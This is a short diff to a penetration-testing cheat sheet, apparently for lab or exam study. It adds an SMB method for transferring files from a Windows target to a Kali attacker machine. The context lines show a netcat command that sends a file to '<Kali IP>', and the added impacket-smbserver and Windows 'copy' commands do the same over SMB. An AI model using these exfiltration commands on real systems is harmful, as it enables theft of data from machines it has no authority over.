@@ -179,6 +179,19 @@ On Windows:
 nc -nv <Kali IP> 4444 < <path to file>
 `````
 
+#### SMB
+Start a server on Kali:
+
+````
+sudo impacket-smbserver <sharename> .
+`````
+Transfer the file from Windows (use backslashes and double backslashes in front of Kali's IP in the command below):
+
+````
+copy C:<path to file> \\<kali IP>\<sharename>\<filename>
+`````
+
+
 #### PowerShell
 
 Complex because standard TFTP, FTP, and HTTP servers are rarely enabled on Windows by default. 
